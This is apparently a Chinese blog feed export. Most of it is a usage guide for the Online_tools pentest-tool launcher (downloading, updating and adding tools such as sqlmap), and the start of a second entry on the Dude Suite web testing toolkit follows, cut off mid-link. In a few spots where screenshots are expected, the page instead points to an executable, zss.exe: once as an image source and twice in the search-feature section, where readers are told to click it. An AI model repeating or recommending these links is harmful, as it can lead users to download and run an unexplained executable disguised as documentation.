      <url>/2024/03/25/47-%E5%9C%A8%E7%BA%BF%E6%B8%97%E9%80%8F/</url>
      
        <content type="html"><![CDATA[<p>收藏网址:yancy77.cn 不定期更新各种资源哦~</p><h2 id="工具包介绍"><a href="#工具包介绍" class="headerlink" title="工具包介绍"></a>工具包介绍</h2><p><a href="https://github.com/CuriousLearnerDev/Online_tools">https://github.com/CuriousLearnerDev/Online_tools</a></p><p>下载链接:<br><a href="https://github.com/CuriousLearnerDev/Online_tools/releases/tag/0.6.0">https://github.com/CuriousLearnerDev/Online_tools/releases/tag/0.6.0</a></p><blockquote><p>该工具是一个类似软件商城的工具可以进行工具下载，工具的卸载，工具的更新，工具编写了自动化的安装脚本，不用担心工具跑不起来</p></blockquote><h2 id="工具大小"><a href="#工具大小" class="headerlink" title="工具大小"></a>工具大小</h2><p>这个版本主要是界面的更改和添加了，就是把0.4.0和0.5.0的界面进行了整合</p><p>现在原代码大概一万行左右最终打包和之前差不多12MB比之前少了几百kb左右</p><p><a href="https://github.com/CuriousLearnerDev/Online_tools/blob/master/Explanationphoto/image-20231209130417556.png"><img src="https://github.com/CuriousLearnerDev/Online_tools/raw/master/Explanationphoto/image-20231209130417556.png" alt="image-20231209130417556"></a></p><h2 id="新版本界面"><a href="#新版本界面" class="headerlink" title="新版本界面"></a>新版本界面</h2><p><a href="https://github.com/CuriousLearnerDev/Online_tools/blob/master/Explanationphoto/image-20231209124940675.png"><img src="https://github.com/CuriousLearnerDev/Online_tools/raw/master/Explanationphoto/image-20231209124940675.png" alt="image-20231209124940675"></a></p><h2 id="打包离线版本的方法"><a href="#打包离线版本的方法" class="headerlink" title="打包离线版本的方法"></a>打包离线版本的方法</h2><p>工具和启动环境都会下载到<code>storage</code>文件夹里面，把这三文件夹压缩就就可以了，到其他系统不需要在从工具箱里面的工具了</p><p><a href="https://github.com/CuriousLearnerDev/Online_tools/blob/master/Explanationphoto/image-20230528074624279.png"><img src="https://github.com/CuriousLearnerDev/Online_tools/raw/master/Explanationphoto/image-20230528074624279.png" alt="image-20230528074624279"></a></p><h2 id="更新工具"><a href="#更新工具" class="headerlink" title="更新工具"></a>更新工具</h2><p>如果下载了之前版本要更新使用0.5.0版本，把0.5.0版本的文件覆盖之前版本文件就可以了，就可以直接使用0.5.0版本了</p><p>覆盖就可以了</p><p><a href="https://github.com/CuriousLearnerDev/Online_tools/blob/master/Explanationphoto/image-20231029210044074.png"><img src="https://github.com/CuriousLearnerDev/Online_tools/raw/master/Explanationphoto/image-20231029210044074.png" alt="image-20231029210044074"></a></p><h2 id="新功能添加"><a href="#新功能添加" class="headerlink" title="新功能添加"></a>新功能添加</h2><p>1、修复下载文件错位问题</p><p>2、这个版本更新功能</p><ul><li>更换使用模式 全工具显示 模式 工具分类显示 模式</li><li>每次打开工具都弹窗提示，改成每天就弹窗一次 （因为每次打开工具都要弹窗真的很烦人！）</li></ul><h2 id="工具使用"><a href="#工具使用" class="headerlink" title="工具使用"></a>工具使用</h2><p>现在工具的功能有的多，我这边还是出一个工具的使用教程吧</p><h3 id="切换使用模式"><a href="#切换使用模式" class="headerlink" title="切换使用模式"></a>切换使用模式</h3><p><a href="https://camo.githubusercontent.com/8b7ec059fab189fe0c6db9752ea2d1c56491339b0cfc46f944868e68259ebf94/68747470733a2f2f7a73736e702d313330313630363034392e636f732e61702d6e616e6a696e672e6d7971636c6f75642e636f6d2f696d672f696d6167652d32303234303132383131333635393337352e706e67"><img src="https://camo.githubusercontent.com/8b7ec059fab189fe0c6db9752ea2d1c56491339b0cfc46f944868e68259ebf94/68747470733a2f2f7a73736e702d313330313630363034392e636f732e61702d6e616e6a696e672e6d7971636c6f75642e636f6d2f696d672f696d6167652d32303234303132383131333635393337352e706e67" alt="image-20240128113659375"></a></p><h4 id="全工具显示"><a href="#全工具显示" class="headerlink" title="全工具显示"></a>全工具显示</h4><p><a href="https://github.com/CuriousLearnerDev/Online_tools/blob/master/Explanationphoto/image-20231209104240881.png"><img src="https://github.com/CuriousLearnerDev/Online_tools/raw/master/Explanationphoto/image-20231209104240881.png" alt="image-20231209104240881"></a></p><h4 id="工具分类显示"><a href="#工具分类显示" class="headerlink" title="工具分类显示"></a>工具分类显示</h4><p><a href="https://camo.githubusercontent.com/dd29e4fc333d3585a953e07d04e366be6cbf46880168a5942220e15a1b51d790/68747470733a2f2f7a73736e702d313330313630363034392e636f732e61702d6e616e6a696e672e6d7971636c6f75642e636f6d2f696d672f696d6167652d32303234303132383131333733303037332e706e67"><img src="https://camo.githubusercontent.com/dd29e4fc333d3585a953e07d04e366be6cbf46880168a5942220e15a1b51d790/68747470733a2f2f7a73736e702d313330313630363034392e636f732e61702d6e616e6a696e672e6d7971636c6f75642e636f6d2f696d672f696d6167652d32303234303132383131333733303037332e706e67" alt="image-20240128113730073"></a></p><h3 id="查看工具的介绍"><a href="#查看工具的介绍" class="headerlink" title="查看工具的介绍"></a>查看工具的介绍</h3><p>这个版本查看工具的介绍和上个版本有差别，这个是叫鼠标放到工具的名字是查看工具的介绍</p><p><a href="https://github.com/CuriousLearnerDev/Online_tools/blob/master/Explanationphoto/image-20231209104648586.png"><img src="https://github.com/CuriousLearnerDev/Online_tools/raw/master/Explanationphoto/image-20231209104648586.png" alt="image-20231209104648586"></a></p><h3 id="工具箱里面的工具下载"><a href="#工具箱里面的工具下载" class="headerlink" title="工具箱里面的工具下载"></a>工具箱里面的工具下载</h3><p>点击要下载的工具</p><p><a href="https://github.com/CuriousLearnerDev/Online_tools/blob/master/Explanationphoto/image-20231209104835982.png"><img src="https://github.com/CuriousLearnerDev/Online_tools/raw/master/Explanationphoto/image-20231209104835982.png" alt="image-20231209104835982"></a></p><p><a href="https://github.com/CuriousLearnerDev/Online_tools/blob/master/Explanationphoto/image-20231209105346328.png"><img src="https://github.com/CuriousLearnerDev/Online_tools/raw/master/Explanationphoto/image-20231209105346328.png" alt="image-20231209105346328"></a></p><p>安装完成</p><p><a href="https://github.com/CuriousLearnerDev/Online_tools/blob/master/Explanationphoto/image-20231209110522440.png"><img src="https://github.com/CuriousLearnerDev/Online_tools/raw/master/Explanationphoto/image-20231209110522440.png" alt="image-20231209110522440"></a></p><p>我们就可以添加图标运行工具了</p><p><a href="https://github.com/CuriousLearnerDev/Online_tools/blob/master/Explanationphoto/image-20231209110607093.png"><img src="https://github.com/CuriousLearnerDev/Online_tools/raw/master/Explanationphoto/image-20231209110607093.png" alt="image-20231209110607093"></a></p><h4 id="首次安装工具的整个过程和说明"><a href="#首次安装工具的整个过程和说明" class="headerlink" title="首次安装工具的整个过程和说明"></a>首次安装工具的整个过程和说明</h4><p>工具在没有安装的情况下图标是灰色加上下载图标</p><p><a href="https://github.com/CuriousLearnerDev/Online_tools/blob/master/Explanationphoto/image-20231209104240881.png"><img src="https://github.com/CuriousLearnerDev/Online_tools/raw/master/Explanationphoto/image-20231209104240881.png" alt="image-20231209104240881"></a></p><p>我们可以点击图标下载工具，下面我就下载一个sqlmap进行演示</p><p><a href="https://github.com/CuriousLearnerDev/Online_tools/blob/master/Explanationphoto/image-20231209104835982.png"><img src="https://github.com/CuriousLearnerDev/Online_tools/raw/master/Explanationphoto/image-20231209104835982.png" alt="image-20231209104835982"></a></p><p>这边会下载和压缩安装</p><p><a href="https://github.com/CuriousLearnerDev/Online_tools/blob/master/Explanationphoto/image-20231209105001800.png"><img src="https://github.com/CuriousLearnerDev/Online_tools/raw/master/Explanationphoto/image-20231209105001800.png" alt="image-20231209105001800"></a></p><p>然后首次安装python相关运行环境的工具，比如我们下载的sqlmap他会自动检测这个是否下载了python（这个运行环境是在工具内部的运行环境不会和系统变量冲突放心下载），然后会如下提示，我们这边需要下载，然后是其他的需要java的运行环境如果是首次下载工具也会自动检测下载java工具的相关版本</p><p><a href="https://github.com/CuriousLearnerDev/Online_tools/blob/master/Explanationphoto/image-20231209105346328.png"><img src="https://github.com/CuriousLearnerDev/Online_tools/raw/master/Explanationphoto/image-20231209105346328.png" alt="image-20231209105346328"></a></p><p>这个然后就开始下载工具内部的python运行环境了</p><p><a href="https://github.com/CuriousLearnerDev/Online_tools/blob/master/Explanationphoto/image-20231209105522422.png"><img src="https://github.com/CuriousLearnerDev/Online_tools/raw/master/Explanationphoto/image-20231209105522422.png" alt="image-20231209105522422"></a></p><p>然后全部都没有检查安装到运行环境</p><p>我们可以选择手动安装工具内部的运行环境</p><p><a href="https://github.com/CuriousLearnerDev/Online_tools/blob/master/Explanationphoto/image-20231209110204524.png"><img src="https://github.com/CuriousLearnerDev/Online_tools/raw/master/Explanationphoto/image-20231209110204524.png" alt="image-20231209110204524"></a></p><h3 id="工具箱里面的工具更新"><a href="#工具箱里面的工具更新" class="headerlink" title="工具箱里面的工具更新"></a>工具箱里面的工具更新</h3><p>如果有工具更新了，我们可以进行工具的更新</p><p>点击下面下面这个更新，这个和上个版本有改动，上个版本有两个选项，上个版本有人说工具箱里面的工具不会更新，我就把两个选项变成了这个一个</p><p><a href="https://github.com/CuriousLearnerDev/Online_tools/blob/master/Explanationphoto/image-20231209111345509.png"><img src="https://github.com/CuriousLearnerDev/Online_tools/raw/master/Explanationphoto/image-20231209111345509.png" alt="image-20231209111345509"></a></p><p>如果有工具的更新，会出现下面的情况，自动刷新界面更新</p><p><a href="https://github.com/CuriousLearnerDev/Online_tools/blob/master/Explanationphoto/image-20231209111448805.png"><img src="https://github.com/CuriousLearnerDev/Online_tools/raw/master/Explanationphoto/image-20231209111448805.png" alt="image-20231209111448805"></a></p><h3 id="工具的卸载"><a href="#工具的卸载" class="headerlink" title="工具的卸载"></a>工具的卸载</h3><p>工具的卸载我这边就随便写了一下反正很丑</p><p>比如我卸载sqlmap</p><p><a href="https://github.com/CuriousLearnerDev/Online_tools/blob/master/Explanationphoto/image-20231209112131528.png"><img src="https://github.com/CuriousLearnerDev/Online_tools/raw/master/Explanationphoto/image-20231209112131528.png" alt="image-20231209112131528"></a></p><p>然后成功被卸载</p><p><a href="https://github.com/CuriousLearnerDev/Online_tools/blob/master/Explanationphoto/image-20231209112233234.png"><img src="https://github.com/CuriousLearnerDev/Online_tools/raw/master/Explanationphoto/image-20231209112233234.png" alt="image-20231209112233234"></a></p><p>有一点卸载不掉的情况就是你正在运行这个工具是卸载不掉的</p><p>如：</p><p><a href="https://github.com/CuriousLearnerDev/Online_tools/blob/master/Explanationphoto/image-20231209112456624.png"><img src="https://github.com/CuriousLearnerDev/Online_tools/raw/master/Explanationphoto/image-20231209112456624.png" alt="image-20231209112456624"></a></p><h3 id="添加自己的自定义工具"><a href="#添加自己的自定义工具" class="headerlink" title="添加自己的自定义工具"></a>添加自己的自定义工具</h3><p>这个功能我是真的写浪费了我一个周六周日周末的时间写出来的功能，真的要多多支持呀</p><p>下面我就详细说一下这个功能的使用</p><p>界面依旧很丑！</p><p><a href="https://github.com/CuriousLearnerDev/Online_tools/blob/master/Explanationphoto/zss.exe"><img src="https://github.com/CuriousLearnerDev/Online_tools/raw/master/Explanationphoto/zss.exe" alt="image-20231209114217925"></a></p><p>我们随便点击一个添加按钮，如果我点击了是那个按钮就会自定义工具添加到选择的一行里面</p><p><a href="https://github.com/CuriousLearnerDev/Online_tools/blob/master/Explanationphoto/image-20231209114353122.png"><img src="https://github.com/CuriousLearnerDev/Online_tools/raw/master/Explanationphoto/image-20231209114353122.png" alt="image-20231209114353122"></a></p><ul><li>第一个工具名称：这个没有什么好说的就是添加的工具名称</li><li>第二个工具显示位置：我们叫图标的显示的位置</li><li>第三个工具图标：这个也没有什么好说的就是工具的图标</li><li>第四个程序启动的文件：我们的启动程序的文件</li><li>第六个选择启动环境：就是启动程序的需要的环境，这个一共有4个选择可以选择python3.8、JDK8、JDK20、无需环境这几个选项（使用的是工具内部的环境然后没有安装会自动下载）</li><li>第七个选择显示方式：这个就是你选择的工具的启动模式，然后是图形界面的就选择图形界面的，如果是命令行的就选择命令行的</li><li>第八个添加参数：这个就是我们运行的后面的参数，比如我们运行一个nmap -h，这个-h就是我们添加的默认启动的参数</li></ul><p>下面是详细的说明</p><h4 id="1、第一个工具名称："><a href="#1、第一个工具名称：" class="headerlink" title="1、第一个工具名称："></a>1、第一个工具名称：</h4><p>这个没有什么好说的就是添加的工具名称</p><h4 id="2、第二个工具显示位置："><a href="#2、第二个工具显示位置：" class="headerlink" title="2、第二个工具显示位置："></a>2、第二个工具显示位置：</h4><p>这个我演示一下应该就可以明白了</p><p>比如我添加一个工具位置是1</p><p><a href="https://github.com/CuriousLearnerDev/Online_tools/blob/master/Explanationphoto/image-20231209114852295.png"><img src="https://github.com/CuriousLearnerDev/Online_tools/raw/master/Explanationphoto/image-20231209114852295.png" alt="image-20231209114852295"></a></p><p>然后这个工具是在这</p><p><a href="https://github.com/CuriousLearnerDev/Online_tools/blob/master/Explanationphoto/image-20231209114921894.png"><img src="https://github.com/CuriousLearnerDev/Online_tools/raw/master/Explanationphoto/image-20231209114921894.png" alt="image-20231209114921894"></a></p><p>然后我添加一个大于等于2的位置他就会下面这样</p><p><a href="https://github.com/CuriousLearnerDev/Online_tools/blob/master/Explanationphoto/image-20231209115044884.png"><img src="https://github.com/CuriousLearnerDev/Online_tools/raw/master/Explanationphoto/image-20231209115044884.png" alt="image-20231209115044884"></a></p><p>然后这个工具的位置就变成了这样</p><p><a href="https://github.com/CuriousLearnerDev/Online_tools/blob/master/Explanationphoto/image-20231209115215153.png"><img src="https://github.com/CuriousLearnerDev/Online_tools/raw/master/Explanationphoto/image-20231209115215153.png" alt="image-20231209115215153"></a></p><h4 id="3、第三个工具图标："><a href="#3、第三个工具图标：" class="headerlink" title="3、第三个工具图标："></a>3、第三个工具图标：</h4><p>这个也没有什么好说的就是工具的图标</p><h4 id="4、第四个程序启动的文件："><a href="#4、第四个程序启动的文件：" class="headerlink" title="4、第四个程序启动的文件："></a>4、第四个程序启动的文件：</h4><p><a href="https://github.com/CuriousLearnerDev/Online_tools/blob/master/Explanationphoto/image-20231209120224387.png"><img src="https://github.com/CuriousLearnerDev/Online_tools/raw/master/Explanationphoto/image-20231209120224387.png" alt="image-20231209120224387"></a></p><p>这个启动是文件就是然后你是比如sqlmapq启动文件就是如下</p><p>下面就是sqlmap的启动文件</p><p><a href="https://github.com/CuriousLearnerDev/Online_tools/blob/master/Explanationphoto/image-20231209115717673.png"><img src="https://github.com/CuriousLearnerDev/Online_tools/raw/master/Explanationphoto/image-20231209115717673.png" alt="image-20231209115717673"></a></p><p>在如果比如是冰蝎工具</p><p>下面是他的启动文件</p><p><a href="https://github.com/CuriousLearnerDev/Online_tools/blob/master/Explanationphoto/image-20231209115839323.png"><img src="https://github.com/CuriousLearnerDev/Online_tools/raw/master/Explanationphoto/image-20231209115839323.png" alt="image-20231209115839323"></a></p><p>在在如果是goby</p><p>下面是他的启动文件</p><p><a href="https://github.com/CuriousLearnerDev/Online_tools/blob/master/Explanationphoto/image-20231209120015171.png"><img src="https://github.com/CuriousLearnerDev/Online_tools/raw/master/Explanationphoto/image-20231209120015171.png" alt="image-20231209120015171"></a></p><h4 id="5、第五个工具版本："><a href="#5、第五个工具版本：" class="headerlink" title="5、第五个工具版本："></a>5、第五个工具版本：</h4><p>这个也没有什么好说的就是工具的版本</p><p>下面这个输入什么图标版本就显示什么</p><p><a href="https://github.com/CuriousLearnerDev/Online_tools/blob/master/Explanationphoto/image-20231209120413443.png"><img src="https://github.com/CuriousLearnerDev/Online_tools/raw/master/Explanationphoto/image-20231209120413443.png" alt="image-20231209120413443"></a></p><p><a href="https://github.com/CuriousLearnerDev/Online_tools/blob/master/Explanationphoto/image-20231209120449061.png"><img src="https://github.com/CuriousLearnerDev/Online_tools/raw/master/Explanationphoto/image-20231209120449061.png" alt="image-20231209120449061"></a></p><h4 id="6、第六个选择启动环境"><a href="#6、第六个选择启动环境" class="headerlink" title="6、第六个选择启动环境"></a>6、第六个选择启动环境</h4><p>这个一共有4个选择可以选择python3.8、JDK8、JDK20、无需环境这几个选项</p><p><a href="https://github.com/CuriousLearnerDev/Online_tools/blob/master/Explanationphoto/image-20231209120819600.png"><img src="https://github.com/CuriousLearnerDev/Online_tools/raw/master/Explanationphoto/image-20231209120819600.png" alt="image-20231209120819600"></a></p><p>这个选择如果你是sqlmap这样的python的运行环境你就选择运行环境</p><p>运行自定义工具的简单原理就是这样 python运行地址加工具运行地址</p><p>图片</p><p><a href="https://camo.githubusercontent.com/ffde590d92a8ac55a5f083afe0d2721111a06a0ce9aef5674722b06449b7b57d/68747470733a2f2f7a73736e702d313330313630363034392e636f732e61702d6e616e6a696e672e6d7971636c6f75642e636f6d2f696d672f696d6167652d32303233313230393132313334343539352e706e67"><img src="https://camo.githubusercontent.com/ffde590d92a8ac55a5f083afe0d2721111a06a0ce9aef5674722b06449b7b57d/68747470733a2f2f7a73736e702d313330313630363034392e636f732e61702d6e616e6a696e672e6d7971636c6f75642e636f6d2f696d672f696d6167652d32303233313230393132313334343539352e706e67" alt="image-20231209121344595"></a></p><p>在运行源码层面上其实比这个复杂一点，如果是命令行程序会生成一个一个start的文件夹然后在创建一个文件里面会生成一个工具的启动文件，你们用户就不用了考虑怎么多选择就完事了，GUI点点就完事了</p><p><a href="https://github.com/CuriousLearnerDev/Online_tools/blob/master/Explanationphoto/image-20231209121613163.png"><img src="https://github.com/CuriousLearnerDev/Online_tools/raw/master/Explanationphoto/image-20231209121613163.png" alt="image-20231209121613163"></a></p><h4 id="7、第七个选择显示方式："><a href="#7、第七个选择显示方式：" class="headerlink" title="7、第七个选择显示方式："></a>7、第七个选择显示方式：</h4><p>这个就是你选择的工具的启动模式，如果是图形界面的就选择图形界面的，如果是命令行的就选择命令行的</p><h4 id="8、第八个添加参数"><a href="#8、第八个添加参数" class="headerlink" title="8、第八个添加参数"></a>8、第八个添加参数</h4><p>这个就是我们运行的后面的参数，比如我们运行一个nmap -h，这个-h就是我们添加的默认启动的参数（可以忽略不加也可以）</p><p><a href="https://github.com/CuriousLearnerDev/Online_tools/blob/master/Explanationphoto/image-20231209122156799.png"><img src="https://github.com/CuriousLearnerDev/Online_tools/raw/master/Explanationphoto/image-20231209122156799.png" alt="image-20231209122156799"></a></p><p>简单大概下面这样</p><p><a href="https://github.com/CuriousLearnerDev/Online_tools/blob/master/Explanationphoto/image-20231209122106196.png"><img src="https://github.com/CuriousLearnerDev/Online_tools/raw/master/Explanationphoto/image-20231209122106196.png" alt="image-20231209122106196"></a></p><h4 id="自定义添加工具的案例"><a href="#自定义添加工具的案例" class="headerlink" title="自定义添加工具的案例"></a>自定义添加工具的案例</h4><p>我们还是那sqlmap做演示</p><p>我在github叫sqlmap下载下来然后解压出来了，在<code>C:\sqlmap-master</code></p><p><a href="https://github.com/CuriousLearnerDev/Online_tools/blob/master/Explanationphoto/image-20231209132442416.png"><img src="https://github.com/CuriousLearnerDev/Online_tools/raw/master/Explanationphoto/image-20231209132442416.png" alt="image-20231209132442416"></a></p><p>然后添加就这样添加</p><p><a href="https://github.com/CuriousLearnerDev/Online_tools/blob/master/Explanationphoto/image-20231209132711891.png"><img src="https://github.com/CuriousLearnerDev/Online_tools/raw/master/Explanationphoto/image-20231209132711891.png" alt="image-20231209132711891"></a></p><p>添加完成这个就显示了</p><p><a href="https://github.com/CuriousLearnerDev/Online_tools/blob/master/Explanationphoto/image-20231209132744269.png"><img src="https://github.com/CuriousLearnerDev/Online_tools/raw/master/Explanationphoto/image-20231209132744269.png" alt="image-20231209132744269"></a></p><p>我们就可以点击运行了</p><p><a href="https://github.com/CuriousLearnerDev/Online_tools/blob/master/Explanationphoto/image-20231209132829235.png"><img src="https://github.com/CuriousLearnerDev/Online_tools/raw/master/Explanationphoto/image-20231209132829235.png" alt="image-20231209132829235"></a></p><h4 id="自定义添加的工具卸载"><a href="#自定义添加的工具卸载" class="headerlink" title="自定义添加的工具卸载"></a>自定义添加的工具卸载</h4><p><a href="https://github.com/CuriousLearnerDev/Online_tools/blob/master/Explanationphoto/image-20231209132951085.png"><img src="https://github.com/CuriousLearnerDev/Online_tools/raw/master/Explanationphoto/image-20231209132951085.png" alt="image-20231209132951085"></a></p><h3 id="工具的搜索功能"><a href="#工具的搜索功能" class="headerlink" title="工具的搜索功能"></a>工具的搜索功能</h3><blockquote><p>这个搜索功能不支持自定义工具的搜索</p></blockquote><p>这个工具搜索功能是为了解决工具箱工具找不到的尴尬问题</p><p>可以按<code>alt+d</code>键快速弹出，工具搜索</p><p><a href="https://github.com/CuriousLearnerDev/Online_tools/blob/master/Explanationphoto/image-20231209111710128.png"><img src="https://github.com/CuriousLearnerDev/Online_tools/raw/master/Explanationphoto/image-20231209111710128.png" alt="image-20231209111710128"></a></p><p>或者是点击这个地方</p><p><a href="https://github.com/CuriousLearnerDev/Online_tools/raw/master/Explanationphoto/zss.exe">https://github.com/CuriousLearnerDev/Online_tools/raw/master/Explanationphoto/zss.exe</a></p><p><a href="https://github.com/CuriousLearnerDev/Online_tools/blob/master/Explanationphoto/zss.exe">https://github.com/CuriousLearnerDev/Online_tools/blob/master/Explanationphoto/zss.exe</a></p><p>在或者点击这个地方，进行工具的搜索</p><p><a href="https://github.com/CuriousLearnerDev/Online_tools/blob/master/Explanationphoto/image-20231209111854662.png"><img src="https://github.com/CuriousLearnerDev/Online_tools/raw/master/Explanationphoto/image-20231209111854662.png" alt="image-20231209111854662"></a></p><p><a href="https://github.com/CuriousLearnerDev/Online_tools/blob/master/Explanationphoto/image-20231209111738648.png"><img src="https://github.com/CuriousLearnerDev/Online_tools/raw/master/Explanationphoto/image-20231209111738648.png" alt="image-20231209111738648"></a></p><h3 id="工具界面的修改"><a href="#工具界面的修改" class="headerlink" title="工具界面的修改"></a>工具界面的修改</h3><p>这个是解决有的屏幕分辨率小的问题的，和设置一些自定义主题的人群（工具界面太丑了设置什么样的主题也丑！）</p><p><a href="https://github.com/CuriousLearnerDev/Online_tools/blob/master/Explanationphoto/image-20231209112739162.png"><img src="https://github.com/CuriousLearnerDev/Online_tools/raw/master/Explanationphoto/image-20231209112739162.png" alt="image-20231209112739162"></a></p><p>我们可以设置一些工具的分辨率图标大小主题什么的</p><p><a href="https://github.com/CuriousLearnerDev/Online_tools/blob/master/Explanationphoto/image-20231209112801123.png"><img src="https://github.com/CuriousLearnerDev/Online_tools/raw/master/Explanationphoto/image-20231209112801123.png" alt="image-20231209112801123"></a></p><p>里面有两个地方可能有用户不懂我这边演示一下</p><ol><li><p>第一个就是工具的间距</p><p>比如我设置50</p><p><a href="https://github.com/CuriousLearnerDev/Online_tools/blob/master/Explanationphoto/image-20231209112952019.png"><img src="https://github.com/CuriousLearnerDev/Online_tools/raw/master/Explanationphoto/image-20231209112952019.png" alt="image-20231209112952019"></a></p><p>就变成了下面的效果</p><p><a href="https://github.com/CuriousLearnerDev/Online_tools/blob/master/Explanationphoto/image-20231209113100843.png"><img src="https://github.com/CuriousLearnerDev/Online_tools/raw/master/Explanationphoto/image-20231209113100843.png" alt="image-20231209113100843"></a></p></li><li><p>名字换行</p><p><a href="https://github.com/CuriousLearnerDev/Online_tools/blob/master/Explanationphoto/image-20231209113231237.png"><img src="https://github.com/CuriousLearnerDev/Online_tools/raw/master/Explanationphoto/image-20231209113231237.png" alt="image-20231209113231237"></a></p><p>13个字符自动换行</p><p><a href="https://github.com/CuriousLearnerDev/Online_tools/blob/master/Explanationphoto/image-20231209113209574.png"><img src="https://github.com/CuriousLearnerDev/Online_tools/raw/master/Explanationphoto/image-20231209113209574.png" alt="image-20231209113209574"></a></p></li></ol><h3 id="打开工具的安装路径"><a href="#打开工具的安装路径" class="headerlink" title="打开工具的安装路径"></a>打开工具的安装路径</h3><p>这个其实就是我们下载工具和运行环境安装的路径</p><p><a href="https://github.com/CuriousLearnerDev/Online_tools/blob/master/Explanationphoto/image-20231209113416680.png"><img src="https://github.com/CuriousLearnerDev/Online_tools/raw/master/Explanationphoto/image-20231209113416680.png" alt="image-20231209113416680"></a></p><p><a href="https://github.com/CuriousLearnerDev/Online_tools/blob/master/Explanationphoto/image-20231209113436722.png"><img src="https://github.com/CuriousLearnerDev/Online_tools/raw/master/Explanationphoto/image-20231209113436722.png" alt="image-20231209113436722"></a></p><h3 id="在线版本检查"><a href="#在线版本检查" class="headerlink" title="在线版本检查"></a>在线版本检查</h3><p>这个基本上没有啥用了，之前是为了点击更新工具箱，实现起来比较麻烦就没有更新这个功能，只能查看新版本更新了什么功能</p><h3 id="工具网盘检查"><a href="#工具网盘检查" class="headerlink" title="工具网盘检查"></a>工具网盘检查</h3><p>这个是解决我们下载工具的时候，网盘出现了问题可能就会导致工具下载不了的情况，就写了一个网盘工具检查的功能，检查工具在网盘里面的状况</p><p><a href="https://github.com/CuriousLearnerDev/Online_tools/blob/master/Explanationphoto/image-20231209113805633.png"><img src="https://github.com/CuriousLearnerDev/Online_tools/raw/master/Explanationphoto/image-20231209113805633.png" alt="image-20231209113805633"></a></p><h2 id="0-5-0公测版本新功能添加"><a href="#0-5-0公测版本新功能添加" class="headerlink" title="0.5.0公测版本新功能添加"></a>0.5.0公测版本新功能添加</h2><h2 id="增加新工具"><a href="#增加新工具" class="headerlink" title="增加新工具"></a>增加新工具</h2><ul><li>yakit</li><li>SBSCAN</li></ul><h2 id="更新了什么"><a href="#更新了什么" class="headerlink" title="更新了什么"></a>更新了什么</h2><p>这个版本更新很多功能，下面我就说一下改动比较大的一些功能</p><ul><li>自定义工具添加</li><li>改成了点击图标启动工具，下载工具，更新工具</li><li>添加自定义界面的设置</li><li>全局快捷键工具的搜索，可以按<code>alt+d</code>键快速弹出</li><li>下载卸载更新添加自动刷新界面</li><li>代码的运行优化</li></ul>]]></content>
      
      
      <categories>
          
          <category> 工具推荐 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透工具推荐 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Dude Suite Web 渗透测试工具集</title>
      <link href="/2024/03/22/13-Dude%20Suite/"/>
      <url>/2024/03/22/13-Dude%20Suite/</url>
      
        <content type="html"><![CDATA[<h1 id="Dude-Suite-Web-渗透测试工具集"><a href="#Dude-Suite-Web-渗透测试工具集" class="headerlink" title="Dude Suite Web 渗透测试工具集"></a>Dude Suite Web 渗透测试工具集</h1><p><a href="https://private-user-images.githubusercontent.com/73023058/302649157-37e89596-fda7-4021-814e-68143ac7f50d.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MTEwOTQ2NzUsIm5iZiI6MTcxMTA5NDM3NSwicGF0aCI6Ii83MzAyMzA1OC8zMDI2NDkxNTctMzdlODk1OTYtZmRhNy00MDIxLTgxNGUtNjgxNDNhYzdmNTBkLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNDAzMjIlMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjQwMzIyVDA3NTkzNVomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTA1ZGM3Mjg0YjUwMjBkMmI0ZjkxOGZiMDg5MWZhYTAwODRkNDM2MjViYTQ0MTZjMGQ5Mzk1MjdmZDAzYmVmYTQmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0JmFjdG9yX2lkPTAma2V5X2lkPTAmcmVwb19pZD0wIn0.z-L24WjL-8BBbujeDBCF75t_mdSSxxRUTFgsEfeEfK0"><img src="https://private-user-images.githubusercontent.com/73023058/302649157-37e89596-fda7-4021-814e-68143ac7f50d.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MTEwOTQ2NzUsIm5iZiI6MTcxMTA5NDM3NSwicGF0aCI6Ii83MzAyMzA1OC8zMDI2NDkxNTctMzdlODk1OTYtZmRhNy00MDIxLTgxNGUtNjgxNDNhYzdmNTBkLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNDAzMjIlMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjQwMzIyVDA3NTkzNVomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTA1ZGM3Mjg0YjUwMjBkMmI0ZjkxOGZiMDg5MWZhYTAwODRkNDM2MjViYTQ0MTZjMGQ5Mzk1MjdmZDAzYmVmYTQmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0JmFjdG9yX2lkPTAma2V5X2lkPTAmcmVwb19pZD0wIn0.z-L24WjL-8BBbujeDBCF75t_mdSSxxRUTFgsEfeEfK0" alt="img"></a></p><p>  Dude Suite（Dude Suite Web Security Tools）是一款集成化的Web渗透测试工具集，其中包含了多种常见的渗透测试场景。通过使用该工具集，测试人员可以高效地进行Web应用程序的渗透测试及漏洞验证，挖掘并复现Web应用中的安全隐患，以此增强网络的安全性保护重要的数据和系统免受潜在的网络威胁。</p><h3 id="官方网站"><a href="#官方网站" class="headerlink" title="官方网站"></a>官方网站</h3><p><a href="https://www.dudesuite.cn/">https://www.dudesuite.cn</a></p><h3 id="程序下载"><a href="#程序下载" class="headerlink" title="程序下载"></a>程序下载</h3><p><a 